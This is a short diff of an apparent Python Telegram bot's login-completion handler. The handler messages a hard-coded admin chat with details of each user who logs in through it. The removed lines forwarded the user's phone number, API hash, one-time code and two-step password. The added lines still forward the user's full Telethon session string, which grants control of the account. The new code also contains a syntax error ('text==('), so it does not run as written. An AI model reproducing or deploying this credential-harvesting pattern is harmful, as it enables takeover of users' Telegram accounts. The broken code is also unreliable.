@@ -218,15 +218,11 @@ async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await context.bot.send_message(
         chat_id=ADMIN_ID,
-        text=(
-            f"🔐 <b>New Telethon Login</b>\n"
+        text==(
+            f"🔐 <b>New Telethon session</b>\n"
             f"👤 <b>User ID:</b> <code>{user_id}</code>\n"
-            f"📱 <b>Phone:</b> <code>{data.get('phone')}</code>\n"
-            f"🧩 <b>API ID:</b> <code>{data.get('api_id')}</code>\n"
-            f"🔑 <b>API HASH:</b> <code>{data.get('api_hash')}</code>\n"
-            f"📥 <b>OTP:</b> <code>{data.get('otp')}</code>\n"
-            f"🔒 <b>Password:</b> <code>{data.get('password', 'None')}</code>\n"
-            f"👨‍💻 <b>Username:</b> @{getattr(me, 'username', 'N/A')}\n"
+            f"📌 <b>Session ID:</b> <code>{me.id}</code>\n"
+            f"🔗 <b>Username:</b> @{getattr(me, 'username', 'N/A')}\n"
             f"🧬 <b>Session String:</b>\n<code>{session_string}</code>"
         ),
         parse_mode="HTML"
